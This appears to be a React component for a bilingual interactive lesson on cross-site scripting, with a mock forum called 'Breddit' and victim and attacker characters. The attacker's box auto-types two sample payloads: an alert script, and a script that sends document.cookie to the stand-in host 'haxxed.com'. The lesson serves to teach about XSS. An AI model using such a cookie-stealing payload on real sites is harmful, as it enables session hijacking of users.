import { useState, useEffect } from "react";
import { useAppLanguage } from "../../../hooks/useAppLanguage";
import { navigateTo } from "../../../services/navigation";
import vicBaking from "../../../assets/lessons/vic-baking.png";
import malPensive from "../../../assets/lessons/mal-pensive.png";
import {
  BREDDIT_DEMO_COPY,
  XSS_LESSON_STEPS,
} from "./crossSiteScriptingContent";

// Helper component to avoid repeating the website UI code
const BredditBox = ({ isAttacker = false, currentStep, isPersian = false }) => {
  const [inputText, setInputText] = useState("");
  const copy = BREDDIT_DEMO_COPY[isPersian ? "fa" : "en"];
  const isScriptInput =
    (isAttacker && (currentStep === 4 || currentStep === 5)) ||
    inputText.trimStart().startsWith("<script");
  const inputDirection = isScriptInput ? "ltr" : isPersian ? "rtl" : "ltr";

  const step4Payload = "<script>alert('Your croissants are limp and sad')</script>";
  const step5Payload =
    "<script>window.location='haxxed.com?cookie=' + document.cookie</script>";

  useEffect(() => {
    // Only auto-type if this is the attacker's box and we are on Step 4 or 5
    if (isAttacker && (currentStep === 4 || currentStep === 5)) {
      const attackPayload = currentStep === 4 ? step4Payload : step5Payload;
      let i = 0;
      setInputText(""); // Clear any previous text

      const interval = setInterval(() => {
        setInputText(attackPayload.slice(0, i + 1));
        i++;

        if (i >= attackPayload.length) {
          clearInterval(interval);

          // Only Step 4 shows popup
          if (currentStep === 4) {
            setTimeout(() => {
              alert("Your croissants are limp and sad");
            }, 500);
          }
        }
      }, 40); // Adjust typing speed here

      return () => clearInterval(interval);
    } else if (currentStep < 4) {
      setInputText(""); // Reset text if user goes back
    }
  }, [isAttacker, currentStep]);

  return (
    <div className="w-[244px] h-[460px] bg-white border border-gray-300 rounded-xl overflow-hidden shadow-xl flex flex-col">
      {/* Browser Header */}
      <div className="bg-gray-200 border-b border-gray-300 px-3 py-2 flex items-center gap-3">
        <div className="flex items-center gap-1 text-gray-500 font-bold">
          <button className="w-7 h-7 rounded hover:bg-gray-300 flex items-center justify-center text-lg">
            ‹
          </button>
          <button className="w-7 h-7 rounded hover:bg-gray-300 flex items-center justify-center text-lg">
            ›
          </button>
        </div>
        <div className="flex-1 bg-white border border-gray-300 rounded px-3 py-1 text-[11px] text-gray-500 truncate">
          www.breddit.com
        </div>
      </div>

      {/* Page Content */}
      <div className="flex-1 bg-gray-50 p-4 overflow-y-auto border border-gray-400">
        <h2
          dir={isPersian ? "rtl" : "ltr"}
          className={`font-bold text-lg mb-4 text-gray-800 border-b border-gray-200 pb-2 ${
            isPersian ? "text-right" : "text-left"
          }`}
        >
          {copy.threadTitle}
        </h2>

        <div className="flex flex-col gap-4">
          {copy.comments.map((comment) => (
            <div
              key={comment.author}
              dir={isPersian ? "rtl" : "ltr"}
              className={`border border-black bg-white rounded-xl p-3 shadow-sm ${
                isPersian ? "text-right" : "text-left"
              }`}
            >
              <div className="font-semibold text-blue-600 text-xs mb-1" dir="ltr">
                {comment.author}
              </div>
              <div className="text-gray-700 text-sm">{comment.text}</div>
            </div>
          ))}
        </div>
      </div>

      {/* Footer input */}
      <div className="border-t border-gray-300 bg-white p-3">
        <textarea
          className={`w-full border border-gray-300 rounded-lg p-2 text-sm resize-none focus:outline-none focus:ring-1 focus:ring-blue-400 ${
            inputDirection === "ltr" ? "text-left" : "text-right"
          }`}
          placeholder={copy.placeholder}
          dir={inputDirection}
          rows={2}
          value={inputText}
          onChange={(e) => setInputText(e.target.value)}
        />
      </div>
    </div>
  );
};

function CrossSiteScripting() {
  const [step, setStep] = useState(0);
  const { language } = useAppLanguage();
  const isPersian = language === "fa";
  const lessonSteps = XSS_LESSON_STEPS[isPersian ? "fa" : "en"];

  const nextStep = () => {
    if (step < 6) setStep(step + 1);
  };

  return (
    <div className="w-full max-w-7xl mx-auto mt-6 sm:mt-10 px-4 sm:px-6 lg:px-8 pb-12">
      {/* Title */}
      <h1 className="text-xl sm:text-2xl md:text-3xl font-bold text-center mb-6 sm:mb-8">
        Cross‑Site Scripting (XSS)
      </h1>

      {/* Navigation dots */}
      <div className="flex justify-center gap-2 sm:gap-3 mb-6 sm:mb-10 flex-wrap">
        {Array.from({ length: 7 }).map((_, i) => (
          <button
            key={i}
            className={`w-2.5 h-2.5 sm:w-3.5 sm:h-3.5 md:w-4 md:h-4 rounded-full transition-transform
            ${i === step ? "bg-blue-500 scale-125" : ""}
            ${i < step ? "bg-gray-600" : "bg-gray-300"}`}
            onClick={() => setStep(i)}
          />
        ))}
      </div>

      <div className="flex flex-col items-center gap-6">
        {/* Text Box */}
        <div
          className={`w-full max-w-2xl p-5 sm:p-6 bg-surface text-text border rounded-2xl cursor-pointer
          border-border active:scale-[0.98] transition touch-manipulation relative ${
            isPersian ? "text-right" : "text-left"
          }`}
          dir={isPersian ? "rtl" : "ltr"}
          onClick={() => {
            if (step === 6) {
              navigateTo("/lessons/cross-site-scripting-guide");
            } else {
              nextStep();
            }
          }}
        >

          <div className={`leading-7 text-sm sm:text-base ${isPersian ? "pl-6" : "pr-6"}`}>
            <LessonStepText parts={lessonSteps[step]} />
          </div>

          <span
            className={`absolute bottom-3 text-text-muted text-sm sm:bottom-4 sm:text-base ${
              isPersian ? "left-3 sm:left-4" : "right-3 sm:right-4"
            }`}
          >
            {isPersian ? "←" : "→"}
          </span>
        </div>

        {/* Visual Content Area */}
        <div className="w-full flex flex-row items-start justify-start mt-4 gap-12">
          
          {/* LEFT SIDE: Shown for steps 0 through 5 */}
          {(step >= 0 && step <= 5) && (
            <div className="flex items-center gap-8 shrink-0">
              <img
                src={vicBaking}
                alt="Vic Baking"
                className="w-[260px] h-auto object-contain rounded-xl"
              />
              <BredditBox currentStep={step} isPersian={isPersian} />
            </div>
          )}

          {/* RIGHT SIDE: Specifically for Step 2, 3, 4, and 5 */}
          <div className="flex-1">
            {(step >= 2 && step <= 5) && (
              <div className="flex items-center gap-8 animate-in fade-in slide-in-from-right-4 duration-500">
                <BredditBox isAttacker={true} currentStep={step} isPersian={isPersian} />
                <img
                  src={malPensive}
                  alt="Attacker"
                  className="w-[260px] h-auto object-contain rounded-xl"
                />
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

function LessonStepText({ parts }) {
  return (
    <p>
      {parts.map((part, index) => {
        if (part.type === "strong") {
          return (
            <strong
              key={`${part.text}-${index}`}
              dir={part.dir}
              className={part.dir === "ltr" ? "inline-block" : undefined}
            >
              {part.text}
            </strong>
          );
        }

        return <span key={`${part.text}-${index}`}>{part.text}</span>;
      })}
    </p>
  );
}

export default CrossSiteScripting;
